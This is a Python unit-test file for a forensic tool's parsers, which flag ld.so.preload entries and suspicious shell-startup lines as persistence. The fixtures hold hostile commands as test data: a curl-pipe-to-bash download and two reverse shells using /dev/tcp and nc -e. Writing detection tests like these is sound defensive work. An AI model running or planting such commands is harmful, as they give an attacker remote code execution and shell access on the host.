"""Unit tests for the ld.so.preload and shell-startup persistence parsers.

Both feed dead/underfed rules: LdPreloadRule queries subcategory
'ld_preload_set', and PersistenceAfterLoginRule correlates
'suspicious_startup_line' and 'ld_preload_set' after a suspicious login.
The collector already preserves these files; nothing parsed them.
"""
from pathlib import Path

import pytest

from lfa.parsers.base import ParseContext
from lfa.parsers.startup import LdPreloadParser, StartupScriptParser
from lfa.schema import validate
from lfa.timeeng import TimeContext


@pytest.fixture
def ctx(tmp_path):
    return ParseContext(
        case_id="CASE-01",
        host_id="HOST-01",
        raw_host_dir=tmp_path,
        time_ctx=TimeContext("UTC", "assumed_utc"),
        distro_profile={"distro_id": "ubuntu"},
        artifact_sha256="0" * 64,
        artifact_mtime=1700000000.0,
    )


def _parse(parser, tmp_path, ctx, text, rel):
    f = tmp_path / "artifact"
    f.write_text(text, encoding="utf-8")
    ctx.artifact_rel = rel
    ctx.parser_name = parser.name
    ctx.parser_version = parser.version
    return list(parser.parse(f, ctx))


# ------------------------------------------------------------- ld.so.preload

def test_ld_preload_library_is_flagged(tmp_path, ctx):
    events = _parse(LdPreloadParser(), tmp_path, ctx,
                    "/usr/lib/evil.so\n", rel="etc/ld.so.preload")
    assert len(events) == 1
    ev = events[0]
    assert validate(ev) == []
    assert ev.subcategory == "ld_preload_set"
    assert ev.category == "persistence"
    assert ev.severity == "high"
    assert "evil.so" in ev.description


def test_ld_preload_comments_and_blanks_ignored(tmp_path, ctx):
    events = _parse(LdPreloadParser(), tmp_path, ctx,
                    "# nothing here\n\n   \n", rel="etc/ld.so.preload")
    assert events == []


# ------------------------------------------------------------ startup scripts

def test_startup_curl_pipe_shell_is_flagged(tmp_path, ctx):
    events = _parse(StartupScriptParser(), tmp_path, ctx,
                    "export PATH=/usr/bin\n"
                    "curl -s http://203.0.113.9/x | bash\n",
                    rel="root/.bashrc")
    assert len(events) == 1
    ev = events[0]
    assert validate(ev) == []
    assert ev.subcategory == "suspicious_startup_line"
    assert ev.category == "persistence"
    assert ev.severity == "high"
    assert "curl" in ev.raw_line


def test_startup_reverse_shell_and_ncat_flagged(tmp_path, ctx):
    events = _parse(StartupScriptParser(), tmp_path, ctx,
                    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
                    "nc -e /bin/sh 10.0.0.1 9001\n",
                    rel="etc/profile")
    assert len(events) == 2
    assert all(e.subcategory == "suspicious_startup_line" for e in events)


def test_startup_benign_lines_emit_nothing(tmp_path, ctx):
    events = _parse(StartupScriptParser(), tmp_path, ctx,
                    "# ~/.bashrc\n"
                    "export EDITOR=vim\n"
                    "alias ll='ls -l'\n",
                    rel="home/kali/.bashrc")
    assert events == []
